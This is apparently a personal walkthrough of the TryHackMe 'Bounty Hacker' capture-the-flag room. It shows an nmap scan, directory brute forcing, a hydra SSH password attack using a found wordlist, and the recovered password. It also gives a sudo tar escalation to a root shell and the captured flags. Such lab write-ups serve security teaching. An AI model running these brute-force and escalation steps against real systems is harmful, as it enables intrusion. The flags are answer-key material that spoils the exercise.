**Tristan Gomez**

```
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims!
Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future! 

```

Find open ports on the machine
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS 10.10.115.79
[sudo] password for gomez22: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 12:04 PDT
Nmap scan report for 10.10.115.79
Host is up (0.16s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

```
`
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -u http://10.10.115.79
`
`/images               (Status: 301) [Size: 313] [--> http://10.10.115.79/images/]`


```

<html>

<style>
h3 {text-align: center;}
p {text-align: center;}
.img-container {text-align: center;}
</style>

<div class='img-container'>
	<img src="/images/crew.jpg" tag alt="Crew Picture" style="width:1000;height:563">
</div>

<body>
<h3>Spike:"..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage."</h3>

<hr>

<h3>Jet:"Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef."</h3>

<hr>

<h3>Ed:"I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!"</h3>

<hr>

<h3>Faye:"..hmph.."</h3>

</body>
</html>
```
`Spike, Jet, Ed, Faye`


Who wrote the task list? 
`lin`
-Found locks.txt with passwords
-found task.txt mentioning lin


What service can you bruteforce with the text file found?
-ssh

What is the users password? 
`$ hydra -l lin -P locks.txt ssh://10.10.115.79`  
```[22][ssh] host: 10.10.115.79   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 12:47:27
```
`RedDr4gonSynd1cat3`

user.txt
```
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

```
sudo -l
[sudo] password for lin: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

```

```
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# whoami
root
```

root.txt
```
# cat root.txt
THM{80UN7Y_h4cK3r}

```
